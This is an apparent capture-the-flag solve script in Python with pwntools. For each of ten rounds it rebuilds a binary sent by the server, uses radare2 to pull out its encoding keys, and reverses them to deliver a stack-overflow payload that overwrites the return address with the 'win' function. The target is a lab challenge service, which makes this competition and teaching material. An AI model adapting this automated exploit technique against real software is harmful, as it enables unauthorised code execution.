from pwn import *
import sys
import os
import r2pipe

remote_ip, port = 'pwn.utctf.live','9997'

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

context.log_level = 'debug'

def stage7(payload, val):
    out = []
    for i in range(val, 64+val):
        out.append(payload[i%64])
    return "".join(out)

def stage6(payload, grouping2):
    newarr = [0]*64
    for i in range(16):
        for j in range(4):
            newarr[grouping2[i]*4 + j] = payload[i*4 + j]
    return "".join(newarr)

def stage5(payload, val, op):
    out = []
    for i in range(64):
        if "add" in op:
            out.append(chr((ord(payload[i]) - val) % 256))
        elif "sub" in op:
            out.append(chr((ord(payload[i]) + val) % 256))
    return "".join(out)

def stage4(payload, val):
    out = []
    for i in range(64):
        out.append(chr((ord(payload[i])^val) % 256))
    return "".join(out)

def stage3(payload, val):
    return stage7(payload, val)

def stage2(payload, grouping1):
    newarr = [0]*64
    for i in range(16):
        for j in range(4):
            newarr[grouping1[i]*4 + j] = payload[i*4 + j]
    return "".join(newarr)
    
def stage1(payload, val):
    return stage4(payload, val)

def decrypt(payload, v1, grouping1, v3, v4, v5, grouping2, v7, operator):
    payload = stage7(payload, v7)
    payload = stage6(payload, grouping2)
    payload = stage5(payload, v5, operator)
    payload = stage4(payload, v4)
    payload = stage3(payload, v3)
    payload = stage2(payload, grouping1)
    return stage1(payload, v1)

def pwn(io):
    sla("Press enter when you're ready for the first binary.\n",'\n')
    for i in range(10):
        f = io.recvuntil("You")
        log.info("Iteration "+str(i+1)+"!!!!!!!!")
        with open("out","w+") as fp:
            fp.writelines(f[:-3])
        os.system("cat out | xxd -r > bin && chmod +x bin".format(f))
        
        elf = ELF('bin')
        r = r2pipe.open("./bin")
        r.cmd("aaaaaaaaa")
        a = r.cmd("pf 16d @0x601060").strip().split()
        grouping1 = []
        for i in a:
            try:
                if(int(i,10)<16):
                    grouping1.append(int(i,10))
            except ValueError:
                continue
            except TypeError:
                continue

        b = r.cmd("pf 16d @0x6010a0").strip().split()
        grouping2 = []
        for j in b:
            try:
                if(int(j,10)<16):
                    grouping2.append(int(j,10))
            except ValueError:
                continue
            except TypeError:
                continue

        log.success("grouping1 = " + str(grouping1))
        log.success("grouping2 = " + str(grouping2))

        r.cmd("s sym.encode1")
        r.cmd("so 14")
        v1 = int(r.cmd("pd 1").strip().split(";",1)[0].split()[-1],16)
        r.cmd("s sym.encode3")
        r.cmd("so 6")
        v3 = int(r.cmd("pd 1").strip().split(";",1)[0].split()[-1].strip("]"),16)
        r.cmd("s sym.encode4")
        r.cmd("so 14")
        v4 = int(r.cmd("pd 1").strip().split(";",1)[0].split()[-1],16)
        r.cmd("s sym.encode5")
        r.cmd("so 14")
        v5 = int(r.cmd("pd 1").strip().split(";",1)[0].split()[-1],16)
        operator = r.cmd("pd 1").strip().split(";",1)[0].split()[-3]
        r.cmd("s sym.encode7")
        r.cmd("so 6")
        v7 = int(r.cmd("pd 1").strip().split(";",1)[0].split()[-1].strip("]"),16)

        out = [hex(v1), hex(v3), hex(v4), hex(v5), hex(v7)]
        log.success("ints = " + str(out))

        payload = "a"*0x38 + p64(elf.symbols['win'])
        payload = decrypt(payload, v1, grouping1, v3, v4, v5, grouping2, v7, operator)
        sa("provide input: \n", payload)
        ru("Process exited with return code 100\n")
    io.interactive()


if __name__== "__main__":
    io = remote(remote_ip, port)
    pwn(io)